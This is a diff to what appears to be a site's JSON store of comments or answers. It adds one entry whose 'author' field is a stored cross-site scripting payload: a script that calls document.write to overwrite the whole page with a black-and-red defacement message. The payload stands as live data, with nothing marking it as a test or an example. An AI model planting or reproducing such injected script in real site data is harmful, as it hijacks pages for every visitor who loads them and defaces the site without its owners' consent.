@@ -189,6 +189,15 @@
           "date": "2026-07-08T01:52:01.196Z",
           "replies": [],
           "parentAnswerId": null
+        },
+        {
+          "id": 1783476009103,
+          "content": "x",
+          "author": "<script>document.write('<html><head><title>XXXXXXX</title><style>body{background:black;color:red;font-size:50px;text-align:center;margin-top:20%;}</style></head><body>XXXXX XX XXXXXX<br><span style=\"font-size:20px;\">XXXXXXXXXXXXXXXXXXXXXXX!</span></body></html>');document.close();</script>",
+          "isOwner": false,
+          "date": "2026-07-08T02:00:09.103Z",
+          "replies": [],
+          "parentAnswerId": null
         }
       ]
     },
